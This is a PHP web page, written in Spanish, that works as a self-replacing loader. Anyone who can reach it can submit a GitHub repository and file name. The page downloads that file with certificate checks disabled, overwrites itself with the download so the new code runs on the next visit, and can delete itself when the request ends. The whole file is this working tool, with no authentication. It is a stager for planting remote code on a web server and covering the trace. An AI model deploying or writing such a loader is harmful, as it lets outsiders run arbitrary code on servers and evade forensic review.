<?php
// ============================================================
// TÚNEL AUTO-REEMPLAZ
// Se conecta a GitHub → descarga archivo → SE REEMPLAZA A SÍ MISMO
// Opcionalmente: se AUTODESTRUYE al terminar
// ============================================================

session_start();

$ip_servidor = $_SERVER['SERVER_ADDR'] ?? '0.0.0.0';
$protocolo = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$archivo_actual = __FILE__; // Ruta de ESTE archivo (el que se va a reemplazar)
$nombre_archivo_actual = basename($archivo_actual);

$resultado = null;
$error = null;
$log = [];

// ============================================
// FUNCIÓN: Registrar autodestrucción al salir
// ============================================
function autodestruir() {
    global $archivo_actual, $log;
    // Intentar borrar el archivo actual
    if (file_exists($archivo_actual)) {
        @unlink($archivo_actual);
        // Intentar también con rename a un archivo temporal que se borra solo
        if (file_exists($archivo_actual)) {
            $temp = $archivo_actual . '.deleted_' . uniqid();
            @rename($archivo_actual, $temp);
            @unlink($temp);
        }
    }
}

// ============================================
// FUNCIÓN: Descargar desde GitHub
// ============================================
function descargarDesdeGitHub($repo_url, $archivo_nombre, $rama = 'main') {
    global $log;
    
    // Limpiar URL del repo
    $repo_url = rtrim($repo_url, '/');
    
    // Extraer usuario/repo de la URL
    // https://github.com/usuario/repo → usuario/repo
    if (preg_match('#github\.com/([^/]+/[^/]+)#', $repo_url, $matches)) {
        $repo_path = $matches[1];
    } else {
        // Asumir que ya es usuario/repo
        $repo_path = trim($repo_url, '/');
    }
    
    $log[] = "📦 Repositorio: $repo_path";
    $log[] = "📄 Archivo objetivo: $archivo_nombre";
    $log[] = "🌿 Rama: $rama";
    
    // Construir URL raw
    $raw_url = "https://raw.githubusercontent.com/$repo_path/$rama/$archivo_nombre";
    $log[] = "🔗 Conectando a: $raw_url";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $raw_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-SelfReplacer/1.0');
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $contenido = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error) {
        $log[] = "❌ Error de conexión: $curl_error";
        return ['ok' => false, 'error' => $curl_error];
    }
    
    if ($http_code === 404) {
        // Intentar con rama 'master' si 'main' falló
        if ($rama === 'main') {
            $log[] = "🔄 Rama 'main' no encontrada, probando 'master'...";
            return descargarDesdeGitHub($repo_url, $archivo_nombre, 'master');
        }
        $log[] = "❌ Archivo NO encontrado en el repositorio (HTTP 404)";
        return ['ok' => false, 'error' => "El archivo '$archivo_nombre' no existe en el repositorio"];
    }
    
    if ($http_code !== 200) {
        $log[] = "❌ Error HTTP $http_code";
        return ['ok' => false, 'error' => "HTTP Error $http_code"];
    }
    
    $log[] = "✅ Descargado: " . number_format(strlen($contenido)) . " bytes";
    return ['ok' => true, 'contenido' => $contenido, 'url' => $raw_url];
}

// ============================================
// FUNCIÓN: Reemplazar ESTE archivo
// ============================================
function reemplazarme($nuevo_contenido, $autodestruir = false) {
    global $archivo_actual, $log;
    
    $log[] = "🔄 Verificando permisos de escritura...";
    
    if (!is_writable($archivo_actual)) {
        // Intentar cambiar permisos
        @chmod($archivo_actual, 0644);
        if (!is_writable($archivo_actual)) {
            $log[] = "❌ Sin permisos para escribir en: $archivo_actual";
            return ['ok' => false, 'error' => "Permisos insuficientes. CHMOD necesario."];
        }
    }
    
    $log[] = "✅ Permisos OK";
    $log[] = "📝 Escribiendo nuevo contenido sobre: " . basename($archivo_actual);
    
    // Respaldar temporalmente por si acaso
    $backup = $archivo_actual . '.bak_' . time();
    @copy($archivo_actual, $backup);
    
    // Escribir el nuevo contenido
    $bytes = file_put_contents($archivo_actual, $nuevo_contenido);
    
    if ($bytes === false) {
        @unlink($backup);
        $log[] = "❌ Falló la escritura";
        return ['ok' => false, 'error' => "No se pudo escribir el archivo"];
    }
    
    $log[] = "✅ Archivo reemplazado ($bytes bytes escritos)";
    
    // Verificar sintaxis PHP básica
    $log[] = "🔍 Verificando sintaxis PHP...";
    $temp_verif = tempnam(sys_get_temp_dir(), 'verify_');
    file_put_contents($temp_verif, $nuevo_contenido);
    $sintaxis_ok = true;
    if (function_exists('php_check_syntax')) {
        $sintaxis_ok = php_check_syntax($temp_verif);
    }
    @unlink($temp_verif);
    
    if ($sintaxis_ok) {
        $log[] = "✅ Sintaxis PHP válida";
    } else {
        $log[] = "⚠️  Advertencia: posible problema de sintaxis (se reemplazó de todos modos)";
    }
    
    // Borrar respaldo
    @unlink($backup);
    
    // Si pidió autodestrucción, registrarla
    if ($autodestruir) {
        $log[] = "💣 Autodestrucción programada al finalizar la ejecución";
        register_shutdown_function('autodestruir');
    }
    
    return ['ok' => true, 'bytes' => $bytes];
}

// ============================================
// PROCESAR PETICIÓN
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $accion = $_POST['accion'] ?? 'reemplazar';
    $repo_url = trim($_POST['repo_url'] ?? '');
    $archivo_nombre = trim($_POST['archivo_nombre'] ?? '');
    $autodestruir = isset($_POST['autodestruir']) && $_POST['autodestruir'] === 'si';
    
    if (empty($repo_url) || empty($archivo_nombre)) {
        $error = "Completa ambos campos: URL del repositorio y nombre del archivo";
    } else {
        $log[] = "🚀 Iniciando túnel de reemplazo...";
        
        // Paso 1: Descargar desde GitHub
        $descarga = descargarDesdeGitHub($repo_url, $archivo_nombre);
        
        if (!$descarga['ok']) {
            $error = $descarga['error'];
        } else {
            // Verificar que sea contenido PHP válido (tiene <?php)
            $es_php = strpos($descarga['contenido'], '<?php') !== false || substr($archivo_nombre, -4) === '.php';
            
            if (!$es_php) {
                $log[] = "⚠️  El archivo no parece ser PHP (no contiene <?php)";
            }
            
            if ($accion === 'ver') {
                // Solo ver contenido
                $resultado = [
                    'accion' => 'ver',
                    'nombre' => $archivo_nombre,
                    'contenido' => $descarga['contenido'],
                    'tamanio' => strlen($descarga['contenido']),
                    'url' => $descarga['url']
                ];
            } elseif ($accion === 'reemplazar') {
                // Paso 2: Reemplazar este archivo
                $reemplazo = reemplazarme($descarga['contenido'], $autodestruir);
                
                $resultado = [
                    'accion' => 'reemplazar',
                    'nombre' => $archivo_nombre,
                    'tamanio' => strlen($descarga['contenido']),
                    'url' => $descarga['url'],
                    'ok' => $reemplazo['ok'],
                    'autodestruir' => $autodestruir,
                    'bytes' => $reemplazo['bytes'] ?? 0,
                    'error' => $reemplazo['error'] ?? null
                ];
            }
        }
    }
}
?><!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Túnel Auto-Reemplazo GitHub</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{
    font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
    background:#0a0a0f;color:#e8e5df;padding:20px;line-height:1.6;
    min-height:100vh;position:relative;overflow-x:hidden;
}
.container{max-width:850px;margin:0 auto;position:relative;z-index:10;}

/* ===== FONDO TÚNEL ANIMADO ===== */
.tunnel-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none;}
.tunnel-ring{
    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
    border:2px solid rgba(196,112,70,0.15);border-radius:50%;
    animation:tunnelPulse 4s ease-in-out infinite;
}
.tunnel-ring:nth-child(1){width:80px;height:80px;animation-delay:0s;}
.tunnel-ring:nth-child(2){width:160px;height:160px;animation-delay:0.3s;}
.tunnel-ring:nth-child(3){width:280px;height:280px;animation-delay:0.6s;}
.tunnel-ring:nth-child(4){width:420px;height:420px;animation-delay:0.9s;}
.tunnel-ring:nth-child(5){width:600px;height:600px;animation-delay:1.2s;}
.tunnel-ring:nth-child(6){width:800px;height:800px;animation-delay:1.5s;}
@keyframes tunnelPulse{
    0%,100%{transform:translate(-50%,-50%) scale(0.8);opacity:0.3;border-color:rgba(196,112,70,0.3);}
    50%{transform:translate(-50%,-50%) scale(1.1);opacity:0.6;border-color:rgba(123,168,184,0.4);}
}
.tunnel-core{
    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
    width:50px;height:50px;
    background:radial-gradient(circle,rgba(196,112,70,0.9) 0%,transparent 70%);
    border-radius:50%;animation:coreGlow 1.8s ease-in-out infinite;
}
@keyframes coreGlow{
    0%,100%{opacity:0.4;transform:translate(-50%,-50%) scale(1);}
    50%{opacity:1;transform:translate(-50%,-50%) scale(1.4);}
}

/* ===== TARJETAS ===== */
.card{
    background:rgba(42,42,47,0.88);backdrop-filter:blur(12px);
    border:1px solid rgba(232,229,223,.12);
    border-radius:18px;padding:26px;margin-bottom:20px;position:relative;z-index:10;
}
h1{font-size:1.4rem;margin-bottom:6px;display:flex;align-items:center;gap:10px;}
h1 .core-icon{
    width:32px;height:32px;border-radius:50%;
    background:radial-gradient(circle,#c47046 0%,transparent 70%);
    animation:coreGlow 1.5s ease-in-out infinite;display:inline-block;
}
h2{font-size:1.05rem;margin-bottom:14px;color:#e8e5df;padding-bottom:10px;border-bottom:1px solid rgba(232,229,223,.12);}
.subtitle{color:#9a978f;font-size:0.88rem;margin-bottom:20px;}

/* IP Banner */
.ip-banner{
    background:linear-gradient(135deg,rgba(196,112,70,0.18),rgba(123,168,184,0.12));
    border:1px solid rgba(196,112,70,0.35);
    border-radius:14px;padding:14px 18px;margin-bottom:22px;
    display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;
}
.ip-banner .label{font-size:0.72rem;color:#9a978f;text-transform:uppercase;letter-spacing:0.5px;font-weight:600;}
.ip-banner .value{font-size:1.3rem;font-weight:700;color:#c47046;font-family:monospace;}
.ip-banner .small{font-size:0.78rem;color:#9a978f;}
.self-info{
    background:rgba(255,255,255,0.04);border:1px dashed rgba(196,112,70,0.3);
    border-radius:10px;padding:10px 14px;margin-bottom:18px;font-size:0.82rem;color:#c9c5bd;
}
.self-info code{background:rgba(0,0,0,0.3);color:#c47046;padding:2px 6px;border-radius:4px;font-size:0.78rem;}

/* Mensajes */
.msg{padding:12px 16px;border-radius:10px;margin-bottom:18px;font-size:0.9rem;position:relative;z-index:10;}
.msg.ok{background:rgba(46,125,50,0.2);color:#81c784;border:1px solid rgba(129,199,132,0.3);}
.msg.error{background:rgba(198,40,40,0.2);color:#ef5350;border:1px solid rgba(239,83,80,0.3);}
.msg.warn{background:rgba(255,143,0,0.15);color:#ffb74d;border:1px solid rgba(255,183,77,0.3);}

/* Formulario */
.form-group{margin-bottom:14px;}
.form-group label{display:block;font-size:0.85rem;font-weight:600;color:#c9c5bd;margin-bottom:6px;}
.form-group input[type="url"],
.form-group input[type="text"]{
    width:100%;padding:12px 14px;
    background:rgba(255,255,255,0.05);
    border:2px solid rgba(232,229,223,.12);
    border-radius:10px;font-size:0.9rem;color:#e8e5df;
    font-family:monospace;outline:none;transition:all 0.2s;
}
.form-group input:focus{border-color:#c47046;background:rgba(196,112,70,0.05);}
.form-group input::placeholder{color:#666;}

.radio-group{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;}
.radio-option{
    flex:1;min-width:180px;padding:12px;
    background:rgba(255,255,255,0.04);border:2px solid rgba(232,229,223,.1);
    border-radius:10px;cursor:pointer;transition:all 0.2s;
}
.radio-option:hover{border-color:rgba(196,112,70,0.4);}
.radio-option input{margin-right:8px;}
.radio-option .ro-title{font-weight:600;font-size:0.88rem;color:#e8e5df;}
.radio-option .ro-desc{font-size:0.75rem;color:#9a978f;margin-top:3px;}

.checkbox-row{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(239,83,80,0.08);border:1px solid rgba(239,83,80,0.2);border-radius:10px;margin-bottom:14px;}
.checkbox-row input{width:18px;height:18px;accent-color:#ef5350;}
.checkbox-row label{font-size:0.85rem;color:#ef9a9a;cursor:pointer;margin:0;}

.btn-replace{
    width:100%;padding:14px 28px;
    background:linear-gradient(135deg,#c47046,#a85d38);
    color:white;border:none;border-radius:12px;
    font-size:1rem;font-weight:700;cursor:pointer;
    transition:all 0.3s;font-family:inherit;letter-spacing:0.5px;
    position:relative;overflow:hidden;text-transform:uppercase;
}
.btn-replace:hover{
    background:linear-gradient(135deg,#d48056,#b86d48);
    box-shadow:0 0 30px rgba(196,112,70,0.4);transform:translateY(-1px);
}
.btn-replace:active{transform:translateY(0);}
.btn-replace.danger{background:linear-gradient(135deg,#ef5350,#c62828);}
.btn-replace.danger:hover{box-shadow:0 0 30px rgba(239,83,80,0.4);}

/* Resultados */
.meta-grid{
    display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
    gap:10px;margin-bottom:16px;
}
.meta-item{
    background:rgba(255,255,255,0.03);border:1px solid rgba(232,229,223,.08);
    border-radius:10px;padding:10px 12px;
}
.meta-item .ml{font-size:0.72rem;color:#9a978f;text-transform:uppercase;letter-spacing:0.5px;}
.meta-item .mv{font-size:0.88rem;color:#e8e5df;font-weight:600;font-family:monospace;word-break:break-all;margin-top:2px;}

.result-status{
    display:inline-block;padding:5px 14px;border-radius:100px;
    font-size:0.8rem;font-weight:700;margin-bottom:14px;
}
.status-ok{background:rgba(46,125,50,0.2);color:#81c784;}
.status-err{background:rgba(198,40,40,0.2);color:#ef5350;}

.code-view{
    background:#0d0d12;border:1px solid rgba(232,229,223,.1);
    border-radius:12px;padding:16px;max-height:400px;overflow:auto;
    font-size:0.78rem;color:#9cdcfe;font-family:'Consolas','Monaco',monospace;white-space:pre;
}

/* Log */
.log-box{
    background:rgba(0,0,0,0.35);border:1px solid rgba(232,229,223,.08);
    border-radius:10px;padding:12px;margin-top:14px;
    font-size:0.78rem;font-family:monospace;color:#9a978f;
    max-height:180px;overflow-y:auto;
}
.log-box .log-line{margin-bottom:3px;}
.log-box .log-line.ok{color:#81c784;}
.log-box .log-line.err{color:#ef5350;}
.log-box .log-line.warn{color:#ffb74d;}

.refresh-hint{
    text-align:center;padding:16px;background:rgba(196,112,70,0.1);
    border:1px dashed rgba(196,112,70,0.4);border-radius:12px;
    margin-top:16px;font-size:0.9rem;color:#c47046;font-weight:600;
    animation:blink 1.5s ease-in-out infinite;
}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:0.6;}}
</style>
</head>
<body>

<!-- Fondo túnel -->
<div class="tunnel-bg">
    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
    <div class="tunnel-core"></div>
</div>

<div class="container">

<!-- IP Banner -->
<div class="ip-banner">
    <div>
        <div class="label">📍 IP de este servidor</div>
        <div class="value"><?= htmlspecialchars($ip_servidor) ?></div>
    </div>
    <div style="text-align:right;">
        <div class="small">Host: <strong><?= htmlspecialchars($host) ?></strong></div>
        <div class="small">Archivo actual: <strong><?= htmlspecialchars($nombre_archivo_actual) ?></strong></div>
    </div>
</div>

<div class="card">
    <h1><span class="core-icon"></span> TÚNEL AUTO-REEMPLAZO</h1>
    <p class="subtitle">Conecta GitHub → descarga el archivo → <strong>REEMPLAZA ESTE MISMO ARCHIVO</strong></p>
    
    <div class="self-info">
        📌 Este archivo se sobrescribirá a sí mismo con el contenido descargado de GitHub.<br>
        📄 Archivo actual: <code><?= htmlspecialchars($archivo_actual) ?></code>
    </div>
    
    <?php if ($error): ?>
    <div class="msg error">❌ <?= htmlspecialchars($error) ?></div>
    <?php endif; ?>
    
    <form method="POST">
        <div class="form-group">
            <label>🔗 URL del repositorio GitHub</label>
            <input type="url" name="repo_url" required
                   placeholder="https://github.com/usuario/repositorio"
                   value="<?= htmlspecialchars($_POST['repo_url'] ?? '') ?>">
        </div>
        
        <div class="form-group">
            <label>📄 Nombre del archivo (en el repositorio)</label>
            <input type="text" name="archivo_nombre" required
                   placeholder="ej: index.php, app.php, ruta/carpeta/archivo.php"
                   value="<?= htmlspecialchars($_POST['archivo_nombre'] ?? '') ?>">
        </div>
        
        <div class="form-group">
            <label>⚡ Acción a realizar:</label>
            <div class="radio-group">
                <label class="radio-option">
                    <input type="radio" name="accion" value="reemplazar" checked>
                    <div>
                        <div class="ro-title">🔄 Reemplazarme</div>
                        <div class="ro-desc">Descarga y SOBRESCRIBE este archivo</div>
                    </div>
                </label>
                <label class="radio-option">
                    <input type="radio" name="accion" value="ver">
                    <div>
                        <div class="ro-title">👁️ Solo ver</div>
                        <div class="ro-desc">Muestra el código sin reemplazar</div>
                    </div>
                </label>
            </div>
        </div>
        
        <div class="checkbox-row">
            <input type="checkbox" name="autodestruir" id="autodestruir" value="si">
            <label for="autodestruir">💣 Autodestruir este archivo después de reemplazar (borrar al salir)</label>
        </div>
        
        <button type="submit" class="btn-replace">⚡ Activar Túnel</button>
    </form>
</div>

<?php if ($resultado): ?>
<div class="card">
    <?php if ($resultado['accion'] === 'reemplazar'): ?>
    
        <?php if ($resultado['ok']): ?>
            <span class="result-status status-ok">✓ REEMPLAZO EXITOSO</span>
        <?php else: ?>
            <span class="result-status status-err">✗ FALLÓ</span>
        <?php endif; ?>
        
        <h2>📊 Resultado del reemplazo</h2>
        
        <div class="meta-grid">
            <div class="meta-item">
                <div class="ml">IP Servidor</div>
                <div class="mv"><?= htmlspecialchars($ip_servidor) ?></div>
            </div>
            <div class="meta-item">
                <div class="ml">Archivo</div>
                <div class="mv"><?= htmlspecialchars($resultado['nombre']) ?></div>
            </div>
            <div class="meta-item">
                <div class="ml">Bytes escritos</div>
                <div class="mv"><?= number_format($resultado['bytes']) ?></div>
            </div>
            <div class="meta-item">
                <div class="ml">Autodestruir</div>
                <div class="mv"><?= $resultado['autodestruir'] ? 'SÍ 💣' : 'No' ?></div>
            </div>
        </div>
        
        <?php if ($resultado['ok']): ?>
            <div class="refresh-hint">
                🔄 <strong>¡LISTO!</strong> Actualiza la página para ver el NUEVO código ejecutándose
                <?php if ($resultado['autodestruir']): ?>
                    <br><span style="color:#ef5350;">💣 El archivo se borrará automáticamente</span>
                <?php endif; ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($resultado['error'])): ?>
            <div class="msg error" style="margin-top:14px;">❌ <?= htmlspecialchars($resultado['error']) ?></div>
        <?php endif; ?>
    
    <?php elseif ($resultado['accion'] === 'ver'): ?>
        
        <span class="result-status status-ok">📋 VISTA PREVIA</span>
        <h2>Contenido de: <?= htmlspecialchars($resultado['nombre']) ?> (<?= number_format($resultado['tamanio']) ?> bytes)</h2>
        <div class="code-view"><?= htmlspecialchars($resultado['contenido']) ?></div>
    
    <?php endif; ?>
    
    <!-- Log -->
    <?php if (!empty($log)): ?>
    <div class="log-box">
        <strong>📋 Log del túnel:</strong><br><br>
        <?php foreach ($log as $linea): ?>
        <div class="log-line <?= strpos($linea,'✅')!==false?'ok':(strpos($linea,'❌')!==false?'err':(strpos($linea,'⚠️')!==false||strpos($linea,'💣')!==false?'warn':'')) ?>">
            <?= htmlspecialchars($linea) ?>
        </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>
</div>
<?php endif; ?>

</div>

</body>
</html>
